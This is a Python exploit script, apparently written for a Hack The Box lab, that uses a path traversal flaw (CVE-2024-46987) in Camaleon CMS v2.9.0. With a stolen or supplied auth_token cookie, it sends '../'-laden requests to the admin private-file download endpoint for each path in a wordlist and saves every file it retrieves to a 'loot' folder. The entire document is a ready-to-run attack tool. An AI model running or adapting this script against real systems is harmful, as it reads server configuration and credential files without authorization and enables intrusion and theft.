#!/usr/bin/env python3
"""
Camaleon CMS v2.9.0 - Path Traversal Wordlist Scanner
Wrapper around CVE-2024-46987 for authorized HTB testing
"""
import requests
import sys
import argparse
from urllib.parse import quote

def scan(target_url, wordlist, auth_token, output_dir="loot"):
    import os
    os.makedirs(output_dir, exist_ok=True)

    target_url = target_url.rstrip("/")
    hits = []

    with open(wordlist, "r") as f:
        paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"\n[*] Target:    {target_url}")
    print(f"[*] Wordlist:  {wordlist} ({len(paths)} paths)")
    print(f"[*] Output:    {output_dir}/")
    print(f"[*] Starting scan...\n")

    cookies = {"auth_token": auth_token}

    for i, path in enumerate(paths, 1):
        url = (
            f"{target_url}"
            f"/admin/media/download_private_file"
            f"?file=../../../../../../{path.lstrip('/')}"
        )

        try:
            resp = requests.get(url, cookies=cookies, timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [{i}/{len(paths)}] ERROR  {path} -> {e}")
            continue

        if resp.status_code == 200 and len(resp.content) > 0:
            # Save the loot
            safe_name = path.lstrip("/").replace("/", "_")
            out_path = os.path.join(output_dir, safe_name)
            with open(out_path, "wb") as out:
                out.write(resp.content)

            print(f"  [{i}/{len(paths)}] HIT    {path} ({len(resp.content)} bytes) -> saved to {out_path}")
            hits.append(path)
        elif resp.status_code == 302:
            print(f"  [{i}/{len(paths)}] 302    {path} (auth rejected or redirect)")
        elif resp.status_code == 500:
            print(f"  [{i}/{len(paths)}] 500    {path}")
        else:
            print(f"  [{i}/{len(paths)}] {resp.status_code}    {path}")

    print(f"\n{'='*60}")
    print(f"[*] Scan complete. {len(hits)}/{len(paths)} files retrieved.\n")
    if hits:
        print("[+] Successful reads:")
        for h in hits:
            print(f"    {h}")
    print()

def main():
    parser = argparse.ArgumentParser(description="Camaleon CMS Path Traversal Scanner")
    parser.add_argument("-u", "--url", default="http://facts.htb", help="Target base URL (default: http://facts.htb)")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist of file paths to try")
    parser.add_argument("-t", "--token", required=True, help="auth_token cookie value")
    parser.add_argument("-o", "--output", default="loot", help="Directory to save retrieved files (default: loot)")
    args = parser.parse_args()

    scan(args.url, args.wordlist, args.token, args.output)

if __name__ == "__main__":
    main()
